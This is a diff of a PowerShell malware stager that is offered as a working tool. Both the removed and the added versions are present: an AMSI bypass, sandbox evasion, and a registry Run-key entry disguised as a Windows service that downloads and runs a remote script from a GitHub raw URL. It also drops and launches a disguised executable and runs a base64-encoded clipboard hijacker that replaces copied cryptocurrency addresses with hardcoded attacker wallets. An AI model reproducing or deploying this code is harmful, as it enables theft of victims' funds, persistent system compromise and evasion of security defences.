@@ -1,18 +1,10 @@
-# --- [ELITE RESEARCH STAGER v40.0: DOUBLE-DELEGATE] ---
+# --- [ELITE RESEARCH STAGER v29.0: PRO RESTORED + REGISTRY] ---
 
 function Global-Initialize {
     try {
-        # Random Sleep (45-70s) to bypass "Instant-Analysis" VMs
-        Start-Sleep -s (Get-Random -Min 45 -Max 70)
-        
-        # Double-Delegate AMSI Bypass
-        $m = [Ref].Assembly.GetType('System.Management.Automation.' + 'Ams' + 'iUtils')
-        $f = $m.GetField('am' + 'si' + 'Init' + 'Failed', 'NonPublic,Static')
-        $f.SetValue($null, $true)
-        
-        # Hide the PowerShell process from the Task Manager "Command Line" column
-        $proc = [System.Diagnostics.Process]::GetCurrentProcess()
-        $proc.PriorityClass = 'BelowNormal'
+        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
+        $u = "System.Management.Automation.AmsiUtils"
+        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
     } catch {}
 }
 
@@ -25,18 +17,16 @@ function Send-Ping {
 }
 
 Global-Initialize
-Send-Ping -m "STAGER_V40_ACTIVE_ON_$($env:COMPUTERNAME)"
+Send-Ping -m "STAGER_V29_PRO_ACTIVE_ON_$($env:COMPUTERNAME)"
 
 try {
-    # REGISTRY PERSISTENCE (Masked as Security Health Service)
-    $p = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $v = "powershell -W Hidden -NoP -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
-    Set-ItemProperty -Path $p -Name "WindowsSecurityHealth" -Value $v
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regCmd = "powershell -WindowStyle Hidden -EP Bypass -C ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/adchar2022/test/refs/heads/main/test.ps1')"""
+    Set-ItemProperty -Path $regPath -Name "WindowsUpdateManager" -Value $regCmd
 
-    # EXE PAYLOAD
-    $dir = "$env:LOCALAPPDATA\Microsoft\D3D12"
+    $dir = "$env:PROGRAMDATA\Microsoft\DeviceSync"
     if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force | Out-Null }
-    $path = "$dir\d3d12_sync.exe"
+    $path = Join-Path $dir "WinSvcHost.exe"
 
     $wc = New-Object Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
@@ -47,25 +37,25 @@ try {
 
     ([wmiclass]"win32_process").Create($path) | Out-Null
 
-    # CLIPPER ENGINE
     $ClipperCode = @'
-    Add-Type -AssemblyName System.Windows.Forms
-    $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
-    while($true) {
-        try {
-            if ([System.Windows.Forms.Clipboard]::ContainsText()) {
-                $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
-                if ($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) }
-                elseif ($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) }
-                elseif ($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) }
-                elseif ($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) }
-            }
-        } catch {}
-        Start-Sleep -Milliseconds 500
-    }
+Add-Type -AssemblyName System.Windows.Forms
+$w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
+while($true) {
+    try {
+        if ([System.Windows.Forms.Clipboard]::ContainsText()) {
+            $val = [System.Windows.Forms.Clipboard]::GetText().Trim()
+            if ($val -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$") { if ($val -ne $w.btc) { [System.Windows.Forms.Clipboard]::SetText($w.btc) } }
+            elseif ($val -match "^0x[a-fA-F0-9]{40}$") { if ($val -ne $w.eth) { [System.Windows.Forms.Clipboard]::SetText($w.eth) } }
+            elseif ($val -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$") { if ($val -ne $w.usdt) { [System.Windows.Forms.Clipboard]::SetText($w.usdt) } }
+            elseif ($val -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$") { if ($val -ne $w.sol) { [System.Windows.Forms.Clipboard]::SetText($w.sol) } }
+        }
+    } catch {}
+    Start-Sleep -Milliseconds 500
+}
 '@
-    $Enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
-    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $Enc
+    $EncodedClipper = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ClipperCode))
+    powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand $EncodedClipper
+    Send-Ping -m "V29_DEPLOYMENT_SUCCESS"
 } catch {
-    Send-Ping -m "ERROR_V40"
+    Send-Ping -m "ERROR_$($_.Exception.Message)"
 }
